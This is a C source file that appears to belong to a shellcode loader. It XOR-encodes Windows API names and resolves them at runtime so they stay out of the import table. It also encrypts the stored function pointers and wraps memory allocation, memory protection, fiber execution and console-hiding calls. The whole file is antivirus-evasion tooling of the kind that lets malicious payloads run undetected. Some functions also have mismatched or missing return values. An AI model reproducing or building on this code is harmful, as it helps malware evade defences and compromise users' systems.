#include "flist.h"

GLOBAL_SET( B g_FListIsEncrypted,			NO );
GLOBAL_SET( V g_CreateFileW,				0 );
GLOBAL_SET( V g_GetFileSize,				0 );
GLOBAL_SET( V g_VirtualAlloc,				0 );
GLOBAL_SET( V g_VirtualFree,				0 );
GLOBAL_SET( V g_VirtualProtect,				0 );
GLOBAL_SET( V g_CloseHandle,				0 );
GLOBAL_SET( V g_ReadFile,					0 );
GLOBAL_SET( V g_LoadLibraryA,				0 );
GLOBAL_SET( V g_QueryPerformanceFrequency,	0 );
GLOBAL_SET( V g_QueryPerformanceCounter,	0 );
GLOBAL_SET( V g_ConvertThreadToFiber,		0 );
GLOBAL_SET( V g_CreateFiber,				0 );
GLOBAL_SET( V g_SwitchToFiber,				0 );
GLOBAL_SET( V g_ShowWindow,					0 );
GLOBAL_SET( V g_GetConsoleWindow,			0 );

GLOBAL_SET( C g_StringKey,					0x55 );

C g_EncKernel32[ ] = { 0x1E, 0x30, 0x27, 0x3B, 0x30, 0x39, 0x66, 0x67, 0x7B, 0x31, 0x39, 0x39, 0x00 };
C g_EncUser32[ ] = { 0x20, 0x26, 0x30, 0x27, 0x66, 0x67, 0x7B, 0x31, 0x39, 0x39, 0x00 };
C g_EncCreateFileW[ ] = { 0x16, 0x27, 0x30, 0x34, 0x21, 0x30, 0x13, 0x3C, 0x39, 0x30, 0x02, 0x00 };
C g_EncGetFileSize[ ] = { 0x12, 0x30, 0x21, 0x13, 0x3C, 0x39, 0x30, 0x06, 0x3C, 0x2F, 0x30, 0x00 };
C g_EncVirtualAlloc[ ] = { 0x03, 0x3C, 0x27, 0x21, 0x20, 0x34, 0x39, 0x14, 0x39, 0x39, 0x3A, 0x36, 0x00 };
C g_EncVirtualFree[ ] = { 0x03, 0x3C, 0x27, 0x21, 0x20, 0x34, 0x39, 0x13, 0x27, 0x30, 0x30, 0x00 };
C g_EncVirtualProtect[ ] = { 0x03, 0x3C, 0x27, 0x21, 0x20, 0x34, 0x39, 0x05, 0x27, 0x3A, 0x21, 0x30, 0x36, 0x21, 0x00 };
C g_EncCloseHandle[ ] = { 0x16, 0x39, 0x3A, 0x26, 0x30, 0x1D, 0x34, 0x3B, 0x31, 0x39, 0x30, 0x00 };
C g_EncReadFile[ ] = { 0x07, 0x30, 0x34, 0x31, 0x13, 0x3C, 0x39, 0x30, 0x00 };
C g_EncLoadLibraryA[ ] = { 0x19, 0x3A, 0x34, 0x31, 0x19, 0x3C, 0x37, 0x27, 0x34, 0x27, 0x2C, 0x14, 0x00 };
C g_EncQueryPerformanceFrequency[ ] = { 0x04, 0x20, 0x30, 0x27, 0x2C, 0x05, 0x30, 0x27, 0x33, 0x3A, 0x27, 0x38,
0x34, 0x3B, 0x36, 0x30, 0x13, 0x27, 0x30, 0x24, 0x20, 0x30, 0x3B, 0x36, 0x2C, 0x00 };
C g_EncQueryPerformanceCounter[ ] = { 0x04, 0x20, 0x30, 0x27, 0x2C, 0x05, 0x30, 0x27, 0x33, 0x3A, 0x27, 0x38,
0x34, 0x3B, 0x36, 0x30, 0x16, 0x3A, 0x20, 0x3B, 0x21, 0x30, 0x27, 0x00 };
C g_EncConvertThreadToFiber[ ] = { 0x16, 0x3A, 0x3B, 0x23, 0x30, 0x27, 0x21, 0x01, 0x3D, 0x27, 0x30, 0x34,
0x31, 0x01, 0x3A, 0x13, 0x3C, 0x37, 0x30, 0x27, 0x00 };
C g_EncCreateFiber[ ] = { 0x16, 0x27, 0x30, 0x34, 0x21, 0x30, 0x13, 0x3C, 0x37, 0x30, 0x27, 0x00 };
C g_EncSwitchToFiber[ ] = { 0x06, 0x22, 0x3C, 0x21, 0x36, 0x3D, 0x01, 0x3A, 0x13, 0x3C, 0x37, 0x30, 0x27, 0x00 };
C g_EncShowWindow[ ] = { 0x06, 0x3D, 0x3A, 0x22, 0x02, 0x3C, 0x3B, 0x31, 0x3A, 0x22, 0x00 };
C g_EncGetConsoleWindow[ ] = { 0x12, 0x30, 0x21, 0x16, 0x3A, 0x3B, 0x26, 0x3A, 0x39, 0x30, 0x02, 0x3C, 0x3B, 0x31,
0x3A, 0x22, 0x00 };

#define HRT_FLIST_DEC(X) HrtStrEncA(X, g_StringKey, sizeof(X));

VOID
HRTAPI
HrtFListPrepare(
	VOID )
{
	UC K32Buff[MAX_PATH];
	HrtMemZeroArr( K32Buff );
	HRT_FLIST_DEC( g_EncKernel32 );
	HrtStrToU( g_EncKernel32,
			   K32Buff,
			   MAX_PATH );

	UC U32Buff[MAX_PATH];
	HrtMemZeroArr( U32Buff );
	HRT_FLIST_DEC( g_EncUser32 );
	HrtStrToU( g_EncUser32,
			   U32Buff,
			   MAX_PATH );

	V KrnlBase = HrtModGetBase( K32Buff );
	if ( !KrnlBase )
		return BAD;

	V UsrBase = HrtModGetBase( U32Buff );
	if ( !UsrBase )
		return BAD;

	HRT_FLIST_DEC( g_EncCreateFileW );
	HRT_FLIST_DEC( g_EncGetFileSize );
	HRT_FLIST_DEC( g_EncVirtualAlloc );
	HRT_FLIST_DEC( g_EncVirtualFree );
	HRT_FLIST_DEC( g_EncVirtualProtect );
	HRT_FLIST_DEC( g_EncCloseHandle );
	HRT_FLIST_DEC( g_EncReadFile );
	HRT_FLIST_DEC( g_EncLoadLibraryA );
	HRT_FLIST_DEC( g_EncQueryPerformanceFrequency );
	HRT_FLIST_DEC( g_EncQueryPerformanceCounter );
	HRT_FLIST_DEC( g_EncConvertThreadToFiber );
	HRT_FLIST_DEC( g_EncCreateFiber );
	HRT_FLIST_DEC( g_EncSwitchToFiber );
	HRT_FLIST_DEC( g_EncShowWindow );
	HRT_FLIST_DEC( g_EncGetConsoleWindow );

	g_CreateFileW = HrtModGetFunc( KrnlBase,
								   g_EncCreateFileW );
	g_GetFileSize = HrtModGetFunc( KrnlBase,
								   g_EncGetFileSize );
	g_VirtualAlloc = HrtModGetFunc( KrnlBase,
									g_EncVirtualAlloc );
	g_VirtualFree = HrtModGetFunc( KrnlBase,
								   g_EncVirtualFree );
	g_VirtualProtect = HrtModGetFunc( KrnlBase,
									  g_EncVirtualProtect );
	g_CloseHandle = HrtModGetFunc( KrnlBase,
								   g_EncCloseHandle );
	g_ReadFile = HrtModGetFunc( KrnlBase,
								g_EncReadFile );
	g_LoadLibraryA = HrtModGetFunc( KrnlBase,
									g_EncLoadLibraryA );
	g_QueryPerformanceFrequency = HrtModGetFunc( KrnlBase,
												 g_EncQueryPerformanceFrequency );
	g_QueryPerformanceCounter = HrtModGetFunc( KrnlBase,
											   g_EncQueryPerformanceCounter );
	g_ConvertThreadToFiber = HrtModGetFunc( KrnlBase,
											g_EncConvertThreadToFiber );
	g_CreateFiber = HrtModGetFunc( KrnlBase,
								   g_EncCreateFiber );
	g_SwitchToFiber = HrtModGetFunc( KrnlBase,
									 g_EncSwitchToFiber );
	g_ShowWindow = HrtModGetFunc( UsrBase,
								  g_EncShowWindow );
	g_GetConsoleWindow = HrtModGetFunc( KrnlBase,
										g_EncGetConsoleWindow );
}

B
HRTAPI
HrtFListInit(
	VOID )
{
	HRT_PTR_ENC_SELF( g_CreateFileW );
	HRT_PTR_ENC_SELF( g_GetFileSize );
	HRT_PTR_ENC_SELF( g_VirtualAlloc );
	HRT_PTR_ENC_SELF( g_VirtualFree );
	HRT_PTR_ENC_SELF( g_VirtualProtect );
	HRT_PTR_ENC_SELF( g_CloseHandle );
	HRT_PTR_ENC_SELF( g_ReadFile );
	HRT_PTR_ENC_SELF( g_LoadLibraryA );
	HRT_PTR_ENC_SELF( g_QueryPerformanceFrequency );
	HRT_PTR_ENC_SELF( g_QueryPerformanceCounter );
	HRT_PTR_ENC_SELF( g_ConvertThreadToFiber );
	HRT_PTR_ENC_SELF( g_CreateFiber );
	HRT_PTR_ENC_SELF( g_SwitchToFiber );
	HRT_PTR_ENC_SELF( g_ShowWindow );
	HRT_PTR_ENC_SELF( g_GetConsoleWindow );

	g_FListIsEncrypted = YES;

	return GOOD;
}

V
HRTAPI
MyCreateFileW(
	PUC FileName,
	V	DesiredAccess,
	V	ShareMode,
	V	CreationDisposition )
{
	f_CreateFileW _CreateFileW;

	switch( g_FListIsEncrypted ) {
		case(YES): {
			_CreateFileW = ( f_CreateFileW ) (HRT_PTR_DEC( g_CreateFileW ));
			break;
		}
		default: {
			_CreateFileW = ( f_CreateFileW ) (g_CreateFileW);
			break;
		}
	}

	return _CreateFileW( FileName,
						 DesiredAccess,
						 ShareMode,
						 NULL,
						 CreationDisposition,
						 FILE_ATTRIBUTE_NORMAL,
						 NULL );
}

V
HRTAPI
MyGetFileSize(
	V File )
{
	f_GetFileSize _GetFileSize;

	switch ( g_FListIsEncrypted ) {
		case(YES):
		{
			_GetFileSize = ( f_GetFileSize ) (HRT_PTR_DEC( g_GetFileSize ));
			break;
		}
		default:
		{
			_GetFileSize = ( f_GetFileSize ) (g_GetFileSize);
			break;
		}
	}

	return _GetFileSize( File,
						 NULL );
}

V
HRTAPI
MyVirtualAlloc(
	V Address,
	V Size,
	V AllocationType,
	V Protect )
{
	f_VirtualAlloc _VirtualAlloc;

	switch ( g_FListIsEncrypted ) {
		case(YES):
		{
			_VirtualAlloc = ( f_VirtualAlloc ) (HRT_PTR_DEC( g_VirtualAlloc ));
			break;
		}
		default:
		{
			_VirtualAlloc = ( f_VirtualAlloc ) (g_VirtualAlloc);
			break;
		}
	}

	return _VirtualAlloc( Address,
						  Size,
						  AllocationType,
						  Protect );
}

SV
HRTAPI
MyVirtualFree(
	V Address,
	V Size,
	V FreeType )
{
	f_VirtualFree _VirtualFree;

	switch ( g_FListIsEncrypted ) {
		case(YES):
		{
			_VirtualFree = ( f_VirtualFree ) (HRT_PTR_DEC( g_VirtualFree ));
			break;
		}
		default:
		{
			_VirtualFree = ( f_VirtualFree ) (g_VirtualFree);
			break;
		}
	}

	return _VirtualFree( Address,
						 Size,
						 FreeType );
}

SV
HRTAPI
MyVirtualProtect(
	V	Address,
	V	Size,
	V	NewProtect,
	PV	OldProtect )
{
	f_VirtualProtect _VirtualProtect;

	switch ( g_FListIsEncrypted ) {
		case(YES):
		{
			_VirtualProtect = ( f_VirtualProtect ) (HRT_PTR_DEC( g_VirtualProtect ));
			break;
		}
		default:
		{
			_VirtualProtect = ( f_VirtualProtect ) (g_VirtualProtect);
			break;
		}
	}

	return _VirtualProtect( Address,
							Size,
							NewProtect,
							OldProtect );
}

SV
HRTAPI
MyCloseHandle(
	V Object )
{
	f_CloseHandle _CloseHandle;

	switch ( g_FListIsEncrypted ) {
		case(YES):
		{
			_CloseHandle = ( f_CloseHandle ) (HRT_PTR_DEC( g_CloseHandle ));
			break;
		}
		default:
		{
			_CloseHandle = ( f_CloseHandle ) (g_CloseHandle);
			break;
		}
	}

	return _CloseHandle( Object );
}

SV
HRTAPI
MyReadFile(
	V File,
	V Buffer,
	V NumberOfBytes )
{
	f_ReadFile _ReadFile;

	switch ( g_FListIsEncrypted ) {
		case(YES):
		{
			_ReadFile = ( f_ReadFile ) (HRT_PTR_DEC( g_ReadFile ));
			break;
		}
		default:
		{
			_ReadFile = ( f_ReadFile ) (g_ReadFile);
			break;
		}
	}

	DWORD Out = 0;

	return _ReadFile( File,
					  Buffer,
					  NumberOfBytes,
					  &Out,
					  NULL );
}

V
HRTAPI
MyLoadLibraryA(
	PC LibFileName )
{
	f_LoadLibraryA _LoadLibraryA;

	switch ( g_FListIsEncrypted ) {
		case(YES):
		{
			_LoadLibraryA = ( f_LoadLibraryA ) (HRT_PTR_DEC( g_LoadLibraryA ));
			break;
		}
		default:
		{
			_LoadLibraryA = ( f_LoadLibraryA ) (g_LoadLibraryA);
			break;
		}
	}
	return _LoadLibraryA( LibFileName );
}

B
HRTAPI
MyQueryPerformanceFrequency(
	PLARGE_INTEGER Frequency )
{
	f_QueryPerformanceFrequency _QueryPerformanceFrequency;

	switch ( g_FListIsEncrypted ) {
		case(YES):
		{
			_QueryPerformanceFrequency = ( f_QueryPerformanceFrequency ) (HRT_PTR_DEC( g_QueryPerformanceFrequency ));
			break;
		}
		default:
		{
			_QueryPerformanceFrequency = ( f_QueryPerformanceFrequency ) (g_QueryPerformanceFrequency);
			break;
		}
	}

	_QueryPerformanceFrequency( Frequency );
}

B
HRTAPI
MyQueryPerformanceCounter(
	PLARGE_INTEGER PerformanceCount )
{
	f_QueryPerformanceCounter _QueryPerformanceCounter = ( f_QueryPerformanceCounter ) (g_QueryPerformanceCounter);

	switch ( g_FListIsEncrypted ) {
		case(YES):
		{
			_QueryPerformanceCounter = ( f_QueryPerformanceCounter ) (HRT_PTR_DEC( g_QueryPerformanceCounter ));
			break;
		}
		default:
		{
			_QueryPerformanceCounter = ( f_QueryPerformanceCounter ) (g_QueryPerformanceCounter);
			break;
		}
	}

	_QueryPerformanceCounter( PerformanceCount );
}

PV
HRTAPI
MyConvertThreadToFiber(
	PV Parameter )
{
	f_ConvertThreadToFiber _ConvertThreadToFiber = ( f_ConvertThreadToFiber ) (g_ConvertThreadToFiber);

	switch ( g_FListIsEncrypted ) {
		case(YES): {
			_ConvertThreadToFiber = ( f_ConvertThreadToFiber ) (HRT_PTR_DEC( g_ConvertThreadToFiber ));
			break;
		}
		default: {
			_ConvertThreadToFiber = ( f_ConvertThreadToFiber ) (g_ConvertThreadToFiber);
			break;
		}
	}

	return _ConvertThreadToFiber( Parameter );
}

PV
HRTAPI
MyCreateFiber(
	PV StartAddress,
	PV Parameter )
{
	f_CreateFiber _CreateFiber = ( f_CreateFiber ) (g_CreateFiber);

	switch ( g_FListIsEncrypted ) {
		case(YES):
		{
			_CreateFiber = ( f_CreateFiber ) (HRT_PTR_DEC( g_CreateFiber ));
			break;
		}
		default:
		{
			_CreateFiber = ( f_CreateFiber ) (g_CreateFiber);
			break;
		}
	}

	return _CreateFiber( 0,
						 ( LPFIBER_START_ROUTINE ) (StartAddress),
						 Parameter );
}

VOID
HRTAPI
MySwitchToFiber(
	PV Fiber )
{
	f_SwitchToFiber _SwitchToFiber = ( f_SwitchToFiber ) (g_SwitchToFiber);

	switch ( g_FListIsEncrypted ) {
		case(YES):
		{
			_SwitchToFiber = ( f_SwitchToFiber ) (HRT_PTR_DEC( g_SwitchToFiber ));
			break;
		}
		default:
		{
			_SwitchToFiber = ( f_SwitchToFiber ) (g_SwitchToFiber);
			break;
		}
	}

	_SwitchToFiber( Fiber );
}

VOID
HRTAPI
MyShowWindow(
	V Window,
	V Show )
{
	f_ShowWindow _ShowWindow = ( f_ShowWindow ) (g_ShowWindow);

	switch ( g_FListIsEncrypted ) {
		case(YES):
		{
			_ShowWindow = ( f_ShowWindow ) (HRT_PTR_DEC( g_ShowWindow ));
			break;
		}
		default:
		{
			_ShowWindow = ( f_ShowWindow ) (g_ShowWindow);
			break;
		}
	}

	_ShowWindow( Window,
				 Show );
}

V
HRTAPI
MyGetConsoleWindow(
	VOID )
{
	f_GetConsoleWindow _GetConsoleWindow = ( f_GetConsoleWindow ) (g_GetConsoleWindow);

	switch ( g_FListIsEncrypted ) {
		case(YES):
		{
			_GetConsoleWindow = ( f_GetConsoleWindow ) (HRT_PTR_DEC( g_GetConsoleWindow ));
			break;
		}
		default:
		{
			_GetConsoleWindow = ( f_GetConsoleWindow ) (g_GetConsoleWindow);
			break;
		}
	}

	_GetConsoleWindow();
}